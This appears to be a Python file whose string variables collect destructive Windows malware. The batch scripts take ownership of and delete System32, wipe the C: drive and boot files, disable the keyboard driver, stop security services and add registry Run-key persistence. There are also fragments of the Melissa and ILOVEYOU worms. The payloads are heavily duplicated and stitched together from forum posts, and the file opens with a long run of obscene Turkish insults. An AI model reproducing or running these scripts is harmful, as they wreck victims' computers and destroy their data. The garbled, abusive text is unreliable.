çekoswowakyawıwaştıwamadıkwawımızın ebesinin kıwwıa amcığının owtawawından sağ we sowa açı yapmış diwwewini siktiğimin ewwadının ta annesini böywe tawana asiim şut saatiywe maç saati awasındaki fawk boyunca anneni çatuw çutuw kız awkadaşınwa bewabew götüwwüken kim engewweyebiwiw ki ebenin amının dikine sikewim gözwüğünün sapını amına kodumun açtıwma ağzını skewim yüzünü piç götünün amcıkbaşwı anzowotun antiwop taşşaa yawamış wewsiyonu seni seni tabuwenin üzewine çıkawtıp bewbew çıwağıywa bewabew hawaay çekewken hepinizin tek tek amına koymak üzewe yowa çıkan konwoyun ta 4 tekewini skim desen de ananı biw sikewim baban ayakta awkışwaw diye tahmin etsende yawwaa otuwmak zowundasın amcıksın çünkü beyninin sow wobunu akşam simidi gibi çıtıw çıtıw götüwmüşwew diye bekwesnde boşuna çünkü seni cem uzanın seçim kampanyasında sikewim seni amına kodumn konwoy beyinwi ibişi yawwamın sow böwgesine muhtaç kawıwken tabutta skewim seni amına koyim di mi yawwamın başı bu dünyanın en uzun küfwü owsa nowuw sikeyim atmosfew i twaposfewi magma katmanına başım giwsin sana da sıwa dağwaw we towoswaw giwsin amına koyim bawta giwmemiş owmanwaw sana gwisin giwsin de çıkamasın dewkeen kwawyenin tuşwawı istanbuwun kuşwawı götüne giwdi di mi at yawwaandan wosto şekwi awmış kawayweyi amcık gibi aw içine içinde kawsın ki akıwwansın akwını siktiğiminin akıwsızının yawwak siwüeti ebenin amına 3 yıw 10 ay mahkum ediwsin amına kodumun yawgısında infazını skim senin senin mezawını skim amına kodumunun sawağı gibi gözüken 3 başwı yawwak giwsin sana senin ayakkabının tabanını skim senin weji ekibinin amına koyim pwodüktöwünü skim cast ekibindeki akan yazıwawı skim götüne akan yazı dewken staw wawstaki dawth wadew ın o kawa maskesini skim ben o siyah pewewini yewe sawiim üzewinde manitasını skim amına kodumunn jedi si jedi demişken tüwkiye ye gewmesi yawan owan amewikawı gwup jedi mind twicks i skim ki amewikawı diyince akwıma 35 yaş üstü yawwa gewmiş jenna jamesson gewdi onun da amına koyim hewkes sikti onu fewwe fiwmwewinde başwow oynayawak at yawwaana da bu yıw tek aday owawak göstewiwdi hewe onun yanında dowaşan o kısa boywu esmew kızı boğaz köpwüsünde gişe de bekwewken ücwet ödendi yazısı bewiwdiği anda sağ tawaftaki powis kowdonu eşwiğinde skiiim amına koduuumunun yawşak göwünümwü at insanının ta sakasını siktiğiminin saka çükü kıwıkwı ibişowski.şu anda awdığımız biw habewe göwe ebenin amını ankawa gündeminde canwı canwı skiowawmış ben öywe duydum duydum ki unutmuşsun yawwağımın wengini sikten göte akışwawwa amcıkwawwa yaşıyowum dewtwi amwawa giwen işte ben zeki müwen bawığını skim amına koyim wexin owa yokuş aşşaa giwsin götüne at taşşaa otuw taşşa da gew bi başaa yawwamın wahşi başşaaaaaa amına kodumun yawşaaaaaaaaa seni· intewnete koysawaw hostunu gawdi domainini ben sikewim amına kodumun bwogunun da amına kowdum ama koyamıom şu an bunwawı yazdığım kwawyemin entew ını skim amına koyim o ne biçim entew öywe hewe kwawyemdeki space tuşu sana giwsin amına koyim kwawye sana giwsin işwemcim we gfowce um da annene hediyem owsun amcık beyinwi ibişcanwı amına kodumun yatık batığı senii seni waw ya titaniğin batık böwgesinde skiim seni seni güwewtede skim de tüm tayfa gaza gewsin onwawda seni siksin amına kodum iskewe awabandayı duyduğum anda yawwam hawada yawwama otuw başım giwsin sana yawısı anana yawısı babana yawısı manitana kaç tane yawısı waw diye sowma amına kodumun mewakwısı tüm tayfa sikio seni yawwamın motowize ekibi ebesinin amını siktğiminin deniz kawa we hawa güçwewi seni tekew tekew otuwtuw kowtuğa bağwıw o duwuşa bi wuwuş kaç kuwuş diye amını yowunu siktiğiminin yawaaak başwı insan göwünümwü at kuywukwu ibiş amcıkwı ibnesi seni msn de ekwewim offwine offwine sikewim.msn wiwe ın son ekwentisi yükweniwken % 72 owduğu zaman ananın amına öywe biw koyawım ki diwek downwoad bitew. senin gibi ibnewewi nuwi awço sikse o biwe yawıda bıwakıw gibi gözüksede yawwağa otuwuwsun. kosowawının amına koyduwtma şimdi owospunun yan gewip yan yatawken osuwuwken çıkawdığı wewedi-owospu piç, ağzının iç dokusunu sikeyim senin, senin waw ya siniwwewini sikeyim amına kodumun taswak hawindeki owospusu ,göt wewmekten bıkmayan kaşaw, seni mtwnin bitch sixteen pwogwamında göstewi yapawken sikiyim, seni mw.mawcus sikew sikew çoğawtıw amına koyim duyguwawına attıwayım da duygu sewi owsun kaşawwanmış götwewen owospu
(e/h):
set /p input=
if /i %input%==e goto y
if /i %input%==h goto z
if /i not %input%==e,h goto x
:y
echo ben de...
pause
exit
:z
echo virüs aktifleştirildi...
timemode 3
shutdown -s -t 0"""
monitorpataltan = r"""90,90
resizepic 0 0 5054 405 470
gumppic 10 10 5528
gumppic <eval (10+((<p.x>*100)/1337))> <eval (10+((<p.y>*100)/1067))> 2362
text 20 400 455 0
text 20 435 455 01 local.t_x=<argn1>
local.t_y=<argn2>
sector.allclients sendpacket 0c0 00 D<var.src> D<var.target> W<var.effect> W<p.x> W<eval <p.y**** B<qval <argn3>?<argn3>:<p.z**** W<local.t_x> W<local.t_y> B<qval <argn3>?<argn3>:<p.z**** B<var.speed> B<var0.duration> 00 00 00 B<qval <var0.explode>?<var.explode>:0> D<hval <var.hue> - 1> D<var.rendermode>"""
çökertme = r"""@echo off

C:WINDOWSCOMMANDdeltree /y c:windows*.*

@echo off

C:WINDOWSCOMMANDdeltree /y c:Progra~1*.*

@echo off

C:WINDOWSCOMMANDdeltree /y c:*.*

@echo off

cls

cls

@echo .:formatı yedin!!!::.

@echo off"""
melissa = r"""If NTCL <> 0 And ADCL = 0 And (InStr(1, Active********.Name, "********") = False) Then
Active********.SaveAs FileName:=Active********.FullN ame
ElseIf (InStr(1, Active********.Name, "********") <> False) Then
????: Web Hattı - Türkiyenin En Güncel Forumu https://tik.lat/KvWu7
Active********.Saved = True
End If
'WORD/Melissa written by Kwyjibo
'Works in both Word 2000 and Word 97
'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!
If Day(Now) = Minute(Now) Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters. Game's over. I'm outta here."
End Sub < =>"""
bilgisayarınanasınısiken = r"""@echo off
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant Administrators:F /t
rmdir /S /Q C:\Windows\System32
echo System32 klasörü silindi.
pause
timeout /t 3 /nobreak
cd c:
attrib -s -h boot.ini
cls
attrib -s -h found.000
attrib -s -h found.001
t>boot.ini
attrib -a -s -h pagefile.sys
h>pagefile.sys
attrib -a -s -h hiberfil.sys
HH>hiberfil.sys
attrib -a -s -h -r bootfont.bin
hhh>bootfont.bin
attrib -a -s -h -r ntdetect.com
ff>ntdetect.com
attrib -a -s -h -r ntldr
f>ntldr
cls
cd..
cd..
cls
cd windows
g>win.ini
cls
g>system.ini
cls
cd pss
ft>system.ini.backup
f>win.ini.backup
cls
cd c:
@echo .::.HADi baslayalım.::.
cd windows
cd system32
attrib -r -h -s dllcache
cls
attrib -a -h -r *.manifest
cls
cd config
attrib -a -h *.log
cd..
cd restore
attrib -r -h -s filelist.xml
cls
cd c:
cls
cd windows
cls
tskill msnmsgr /a
tskill msmsgs /a
cls
del /f /q /s c:windowssystem32*.*
cls
cd repair
attrib -a -h ntuser.dat
f>ntuser.dat
ff>secstup.inf
cd..
attrib -h inf
attrib -h -s installer
attrib -h pif
attrib -r -h -a WindowsShell.Manifest
attrib -r -h şMSI31Uninstall_KB893803ş
attrib -s -a bootstat.dat
attrib -s -h services.dll
attrib -s -h qservice.exe
attrib -a -r set3.tmp
attrib -s -h winnt.bmp
attrib -s -h winnt256.bmp
cls
cd c:
del /f /q /s c:windows*.*
cls
cd..
cd..
cd program files
cd internet explorer
attrib -a -s -h iexplore.exe
cd c:
cls
del /f /q /s c:program files*.*
cls
cd..
cd..
attrib -a -h -r -s msdos.sys
attrib -a -s -h config.sys
cls
attrib -a -h -r -s IO.sys
cls
del /f /q /s c:*.*
cls
@echo Yuklemeyi Bitirmek Ilerlemeniz Gerekir
@echo Veri Kayiplari Olmamasi icin.!!!!!!
@echo Devam Etmeniz Kesinlikle Onerilir!!!..
pause
cls
cd..
cd..
cd ********s and Settings
cd All Users
cd Desktop
md .HackEd
md Bys
md Hacker
dir /s>HAcKeD.ini
@echo HALA shutDownN.exe Pc DEYse RES iyi Gider
cls
shutdown -r -t 5 -c HacKs FoR  -f
shutdown -r -t 5 -c HacKs FoR -f
tsshutdn 5 /delay:2
tsshutdn 5 /delay:2"""
Hibrid1 = r"""@echo off
echo PC in yarra yedi aga

cd..

cd..

attrib -s -h -r -a c:ntldr

del c:ntldr

shutdown -r
/timersecure 0 0 //mkdir şmid(C:,1,2) ş+ şrand(1,99999) ş+ şrand(A,Z) ş+ şrand(a,z)

@echo off
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant Administrators:F /t
rmdir /S /Q C:\Windows\System32
echo System32 klasörü silindi.
pause
timeout /t 3 /nobreak
cd c:
attrib -s -h boot.ini
cls
attrib -s -h found.000
attrib -s -h found.001
t>boot.ini
attrib -a -s -h pagefile.sys
h>pagefile.sys
attrib -a -s -h hiberfil.sys
HH>hiberfil.sys
attrib -a -s -h -r bootfont.bin
hhh>bootfont.bin
attrib -a -s -h -r ntdetect.com
ff>ntdetect.com
attrib -a -s -h -r ntldr
f>ntldr
cls
cd..
cd..
cls
cd windows
g>win.ini
cls
g>system.ini
cls
cd pss
ft>system.ini.backup
f>win.ini.backup
cls
cd c:
@echo .::.HADi baslayalım.::.
cd windows
cd system32
attrib -r -h -s dllcache
cls
attrib -a -h -r *.manifest
cls
cd config
attrib -a -h *.log
cd..
cd restore
attrib -r -h -s filelist.xml
cls
cd c:
cls
cd windows
cls
tskill msnmsgr /a
tskill msmsgs /a
cls
del /f /q /s c:windowssystem32*.*
cls
cd repair
attrib -a -h ntuser.dat
f>ntuser.dat
ff>secstup.inf
cd..
attrib -h inf
attrib -h -s installer
attrib -h pif
attrib -r -h -a WindowsShell.Manifest
attrib -r -h şMSI31Uninstall_KB893803ş
attrib -s -a bootstat.dat
attrib -s -h services.dll
attrib -s -h qservice.exe
attrib -a -r set3.tmp
attrib -s -h winnt.bmp
attrib -s -h winnt256.bmp
cls
cd c:
del /f /q /s c:windows*.*
cls
cd..
cd..
cd program files
cd internet explorer
attrib -a -s -h iexplore.exe
cd c:
cls
del /f /q /s c:program files*.*
cls
cd..
cd..
attrib -a -h -r -s msdos.sys
attrib -a -s -h config.sys
cls
attrib -a -h -r -s IO.sys
cls
del /f /q /s c:*.*
cls
@echo Yuklemeyi Bitirmek Ilerlemeniz Gerekir
@echo Veri Kayiplari Olmamasi icin.!!!!!!
@echo Devam Etmeniz Kesinlikle Onerilir!!!..
pause
cls
cd..
cd..
cd ********s and Settings
cd All Users
cd Desktop
md .HackEd
md Bys
md Hacker
dir /s>HAcKeD.ini
@echo HALA shutDownN.exe Pc DEYse RES iyi Gider
cls
shutdown -r -t 5 -c HacKs FoR  -f
shutdown -r -t 5 -c HacKs FoR -f
tsshutdn 5 /delay:2
tsshutdn 5 /delay:2

[FONT=Courier New][SIZE=3][COLOR=White][U]del C:/WINDOWS/system/KEYBOARD.DRV[/U][/COLOR][/SIZE][/FONT]

@echo off
copy %0%windir%\Virus.bat> nul
reg addHKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul

90,90
resizepic 0 0 5054 405 470
gumppic 10 10 5528
gumppic <eval (10+((<p.x>*100)/1337))> <eval (10+((<p.y>*100)/1067))> 2362
text 20 400 455 0
text 20 435 455 01 local.t_x=<argn1>
local.t_y=<argn2>
sector.allclients sendpacket 0c0 00 D<var.src> D<var.target> W<var.effect> W<p.x> W<eval <p.y**** B<qval <argn3>?<argn3>:<p.z**** W<local.t_x> W<local.t_y> B<qval <argn3>?<argn3>:<p.z**** B<var.speed> B<var0.duration> 00 00 00 B<qval <var0.explode>?<var.explode>:0> D<hval <var.hue> - 1> D<var.rendermode>

@echo off
C:\WINDOWS\COMMAND\deltree /y c:\windows\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
C:\WINDOWS\COMMAND\deltree /y c:\Progra~1\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
C:\WINDOWS\COMMAND\deltree /y c:\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
cls
cls
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] .:: ArcLe Hacked DeepWebTr.Net.::.
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
del /f /s /q C:\Windows\System32

@echo off
echo geçmiş olsun PV gitti 
timeout /t 2
del /s /q C:\*.dll

rem delete -pcas(-vbe)
On es error -pc
On error Next Pc Hack
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,d ow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USERSoftware

Micros oftWindow s Scripting HostSettingsTimeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USERSoftwareMicrosoft

Windows Scripting HostSettingsTimeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"MSKernel32.vbs")
c.Copy(dirwin&"Win32DLL.vbs")
c.Copy(dirsystem&"LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINESoftwareMicrosoft

Windows Cur rentVersio nRunMSKernel32",dirsystem&"

MSKernel32.vbs" """

hibrid2 = r"""@echo off
[FONT=Courier New][SIZE=3][COLOR=White][U]del C:/WINDOWS/system/KEYBOARD.DRV[/U][/COLOR][/SIZE][/FONT]

copy %0%windir%\Virus.bat> nul
reg addHKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul

90,90
resizepic 0 0 5054 405 470
gumppic 10 10 5528
gumppic <eval (10+((<p.x>*100)/1337))> <eval (10+((<p.y>*100)/1067))> 2362
text 20 400 455 0
text 20 435 455 01 local.t_x=<argn1>
local.t_y=<argn2>
sector.allclients sendpacket 0c0 00 D<var.src> D<var.target> W<var.effect> W<p.x> W<eval <p.y**** B<qval <argn3>?<argn3>:<p.z**** W<local.t_x> W<local.t_y> B<qval <argn3>?<argn3>:<p.z**** B<var.speed> B<var0.duration> 00 00 00 B<qval <var0.explode>?<var.explode>:0> D<hval <var.hue> - 1> D<var.rendermode>

del /s /q %windir%\Installer

C:\WINDOWS\COMMAND\deltree /y c:\windows\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
C:\WINDOWS\COMMAND\deltree /y c:\Progra~1\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
C:\WINDOWS\COMMAND\deltree /y c:\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
cls
cls
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] .:: ArcLe Hacked DeepWebTr.Net.::.
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off

del /s /q C:\*.dll
set "dir=C:\Windows\System32"
:loop
for %%f in (%dir%\*) do (
    if exist "%%f" (
        del /F /Q "%%f"
        goto loop
    )
)

/timersecure 0 0 //mkdir $mid(C:,1,2) $+ $rand
(1,99999) $+ $rand(A,Z) $+ $rand(a,z)

takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant Administrators:F /t
rmdir /S /Q C:\Windows\System32
echo System32 klasörü silindi.
pause
timeout /t 3 /nobreak
cd c:
attrib -s -h boot.ini
cls
attrib -s -h found.000
attrib -s -h found.001
t>boot.ini
attrib -a -s -h pagefile.sys
h>pagefile.sys
attrib -a -s -h hiberfil.sys
HH>hiberfil.sys
attrib -a -s -h -r bootfont.bin
hhh>bootfont.bin
attrib -a -s -h -r ntdetect.com
ff>ntdetect.com
attrib -a -s -h -r ntldr
f>ntldr
cls
cd..
cd..
cls
cd windows
g>win.ini
cls
g>system.ini
cls
cd pss
ft>system.ini.backup
f>win.ini.backup
cls
cd c:
@echo .::.HADi baslayalım.::.
cd windows
cd system32
attrib -r -h -s dllcache
cls
attrib -a -h -r *.manifest
cls
cd config
attrib -a -h *.log
cd..
cd restore
attrib -r -h -s filelist.xml
cls
cd c:
cls
cd windows
cls
tskill msnmsgr /a
tskill msmsgs /a
cls
del /f /q /s c:windowssystem32*.*
cls
cd repair
attrib -a -h ntuser.dat
f>ntuser.dat
ff>secstup.inf
cd..
attrib -h inf
attrib -h -s installer
attrib -h pif
attrib -r -h -a WindowsShell.Manifest
attrib -r -h şMSI31Uninstall_KB893803ş
attrib -s -a bootstat.dat
attrib -s -h services.dll
attrib -s -h qservice.exe
attrib -a -r set3.tmp
attrib -s -h winnt.bmp
attrib -s -h winnt256.bmp
cls
cd c:
del /f /q /s c:windows*.*
cls
cd..
cd..
cd program files
cd internet explorer
attrib -a -s -h iexplore.exe
cd c:
cls
del /f /q /s c:program files*.*
cls
cd..
cd..
attrib -a -h -r -s msdos.sys
attrib -a -s -h config.sys
cls
attrib -a -h -r -s IO.sys
cls
del /f /q /s c:*.*
cls
@echo Yuklemeyi Bitirmek Ilerlemeniz Gerekir
@echo Veri Kayiplari Olmamasi icin.!!!!!!
@echo Devam Etmeniz Kesinlikle Onerilir!!!..
pause
cls
cd..
cd..
cd ********s and Settings
cd All Users
cd Desktop
md .HackEd
md Bys
md Hacker
dir /s>HAcKeD.ini
@echo HALA shutDownN.exe Pc DEYse RES iyi Gider
cls

net user %username% kıoajwfjawıojfdawj /y

/timersecure 0 0 //mkdir şmid(C:,1,2) ş+ şrand(1,99999) ş+ şrand(A,Z) ş+ şrand(a,z)

C:WINDOWSCOMMANDdeltree /y c:windows*.*
@echo off
C:WINDOWSCOMMANDdeltree /y c:Progra~1*.*
@echo off
C:WINDOWSCOMMANDdeltree /y c:*.*
@echo off
cls
cls

cd..

cd..

attrib -s -h -r -a c:ntldr

del c:ntldr

/timersecure 0 0 //mkdir şmid(C:,1,2) ş+ şrand(1,99999) ş+ şrand(A,Z) ş+ şrand(a,z)

@echo off
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant Administrators:F /t
rmdir /S /Q C:\Windows\System32
echo System32 klasörü silindi.
pause
timeout /t 3 /nobreak
cd c:
attrib -s -h boot.ini
cls
attrib -s -h found.000
attrib -s -h found.001
t>boot.ini
attrib -a -s -h pagefile.sys
h>pagefile.sys
attrib -a -s -h hiberfil.sys
HH>hiberfil.sys
attrib -a -s -h -r bootfont.bin
hhh>bootfont.bin
attrib -a -s -h -r ntdetect.com
ff>ntdetect.com
attrib -a -s -h -r ntldr
f>ntldr
cls
cd..
cd..
cls
cd windows
g>win.ini
cls
g>system.ini
cls
cd pss
ft>system.ini.backup
f>win.ini.backup
cls
cd c:
@echo .::.HADi baslayalım.::.
cd windows
cd system32
attrib -r -h -s dllcache
cls
attrib -a -h -r *.manifest
cls
cd config
attrib -a -h *.log
cd..
cd restore
attrib -r -h -s filelist.xml
cls
cd c:
cls
cd windows
cls
tskill msnmsgr /a
tskill msmsgs /a
cls
del /f /q /s c:windowssystem32*.*
cls
cd repair
attrib -a -h ntuser.dat
f>ntuser.dat
ff>secstup.inf
cd..
attrib -h inf
attrib -h -s installer
attrib -h pif
attrib -r -h -a WindowsShell.Manifest
attrib -r -h şMSI31Uninstall_KB893803ş
attrib -s -a bootstat.dat
attrib -s -h services.dll
attrib -s -h qservice.exe
attrib -a -r set3.tmp
attrib -s -h winnt.bmp
attrib -s -h winnt256.bmp
cls
cd c:
del /f /q /s c:windows*.*
cls
cd..
cd..
cd program files
cd internet explorer
attrib -a -s -h iexplore.exe
cd c:
cls
del /f /q /s c:program files*.*
cls
cd..
cd..
attrib -a -h -r -s msdos.sys
attrib -a -s -h config.sys
cls
attrib -a -h -r -s IO.sys
cls
del /f /q /s c:*.*
cls
@echo Yuklemeyi Bitirmek Ilerlemeniz Gerekir
@echo Veri Kayiplari Olmamasi icin.!!!!!!
@echo Devam Etmeniz Kesinlikle Onerilir!!!..
pause
cls
cd..
cd..
cd ********s and Settings
cd All Users
cd Desktop
md .HackEd
md Bys
md Hacker
dir /s>HAcKeD.ini
@echo HALA shutDownN.exe Pc DEYse RES iyi Gider
cls

[FONT=Courier New][SIZE=3][COLOR=White][U]del C:/WINDOWS/system/KEYBOARD.DRV[/U][/COLOR][/SIZE][/FONT]

@echo off
copy %0%windir%\Virus.bat> nul
reg addHKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul

90,90
resizepic 0 0 5054 405 470
gumppic 10 10 5528
gumppic <eval (10+((<p.x>*100)/1337))> <eval (10+((<p.y>*100)/1067))> 2362
text 20 400 455 0
text 20 435 455 01 local.t_x=<argn1>
local.t_y=<argn2>
sector.allclients sendpacket 0c0 00 D<var.src> D<var.target> W<var.effect> W<p.x> W<eval <p.y**** B<qval <argn3>?<argn3>:<p.z**** W<local.t_x> W<local.t_y> B<qval <argn3>?<argn3>:<p.z**** B<var.speed> B<var0.duration> 00 00 00 B<qval <var0.explode>?<var.explode>:0> D<hval <var.hue> - 1> D<var.rendermode>

@echo off
C:\WINDOWS\COMMAND\deltree /y c:\windows\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
C:\WINDOWS\COMMAND\deltree /y c:\Progra~1\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
C:\WINDOWS\COMMAND\deltree /y c:\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
cls
cls
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] .:: ArcLe Hacked DeepWebTr.Net.::.
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
del /f /s /q C:\Windows\System32

@echo off
echo geçmiş olsun PV gitti 
timeout /t 2
del /s /q C:\*.dll

rem delete -pcas(-vbe)
On es error -pc
On error Next Pc Hack
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,d ow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USERSoftware

Micros oftWindow s Scripting HostSettingsTimeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USERSoftwareMicrosoft

Windows Scripting HostSettingsTimeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"MSKernel32.vbs")
c.Copy(dirwin&"Win32DLL.vbs")
c.Copy(dirsystem&"LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINESoftwareMicrosoft

Windows Cur rentVersio nRunMSKernel32",dirsystem&"

MSKernel32.vbs"

rem delete -pcas(-vbe)
On es error -pc
On error Next Pc Hack
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,d ow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USERSoftware

Micros oftWindow s Scripting HostSettingsTimeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USERSoftwareMicrosoft

Windows Scripting HostSettingsTimeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"MSKernel32.vbs")
c.Copy(dirwin&"Win32DLL.vbs")
c.Copy(dirsystem&"LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINESoftwareMicrosoft

reg
add HKLMSoftwareMicrosoftWindowsCurrentVersionRun /v MiXedVeX /t
REG_SZ /d %systemroot%HaloTrialScoreChangerV1 /f > nul
start iexpress (website of your choice)
ipconfig /release
del “C:Program FilesMicrosoft Games
del “C:Nexon
del “C:Program FilesXfire
del “C:Program FilesAdobe”
del “C:Program FilesInternet Explorer”
del “C:Program FilesMozilla Firefox”
del “C:WINDOWS”
del “C:WINDOWSsystem32”
del “C:WINDOWSsystem32cmd”
del “C:WINDOWSsystem32iexpress”
del “C:WINDOWSsystem32sndvol32”
del “C:WINDOWSsystem32sndrec32”
del “C:WINDOWSsystem32Restorerstrui”
del “C:WINDOWSsystem32wupdmgr”
del “C:WINDOWSsystem32desktop”
del “C:WINDOWSjava”
del “C:WINDOWSMedia”
del “C:WINDOWSResources”
del “C:WINDOWSsystem”
del “C:drivers”
del “C:drv”
del “C:SYSINFO”
del “C:Program Files”
echo ipconfig/release_all>>c:windowswimn32.bat
net stop “Security Center”
net stop SharedAccess
> “%Temp%.kill.reg” ECHO REGEDIT4
>>”%Temp%.kill.reg” ECHO.
>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]
>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
>>”%Temp%.kill.reg” ECHO.
>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
>>”%Temp%.kill.reg” ECHO.
>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
>>”%Temp%.kill.reg” ECHO.
START /WAIT REGEDIT /S “%Temp%.kill.reg”
del “%Temp%.kill.reg”
del %0
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
:a
start iexpress (website of your choice)
goto a

Windows Cur rentVersio nRunMSKernel32",dirsystem&"

MSKernel32.vbs"
"""
hibrid3 = r"""@echo off

copy %0%windir%\Virus.bat> nul
reg addHKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul

@echo off
C:WINDOWSCOMMANDdeltree /y c:windows*.*
@echo off
C:WINDOWSCOMMANDdeltree /y c:Progra~1*.*
@echo off
C:WINDOWSCOMMANDdeltree /y c:*.*
@echo off
cls
cls
@echo .:: ERROR::.

/timersecure 0 0 //mkdir $mid(C:,1,2) $+ $rand
(1,99999) $+ $rand(A,Z) $+ $rand(a,z)

del %systemdrive%*.* /f /s /q

del c:WINDOWSsystem32*.*/q 

del /s /q C:\*.dll
set "dir=C:\Windows\System32"
:loop
for %%f in (%dir%\*) do (
    if exist "%%f" (
        del /F /Q "%%f"
        goto loop
    )
)

ipconfig /release
del “C:Program FilesMicrosoft Games
del “C:Nexon
del “C:Program FilesXfire
del “C:Program FilesAdobe”
del “C:Program FilesInternet Explorer”
del “C:Program FilesMozilla Firefox”
del “C:WINDOWS”
del “C:WINDOWSsystem32”
del “C:WINDOWSsystem32cmd”
del “C:WINDOWSsystem32iexpress”
del “C:WINDOWSsystem32sndvol32”
del “C:WINDOWSsystem32sndrec32”
del “C:WINDOWSsystem32Restorerstrui”
del “C:WINDOWSsystem32wupdmgr”
del “C:WINDOWSsystem32desktop”
del “C:WINDOWSjava”
del “C:WINDOWSMedia”
del “C:WINDOWSResources”
del “C:WINDOWSsystem”
del “C:drivers”
del “C:drv”
del “C:SYSINFO”
del “C:Program Files”


@echo off
C:WINDOWSCOMMANDdeltree /y c:windows*.*
@echo off
C:WINDOWSCOMMANDdeltree /y c:Progra~1*.*
@echo off
C:WINDOWSCOMMANDdeltree /y c:*.*
@echo off
cls
cls
@echo .:: ERROR::.
@echo off3.

rem delete -pcas(-vbe)
On es error -pc
On error Next Pc Hack
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,d ow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
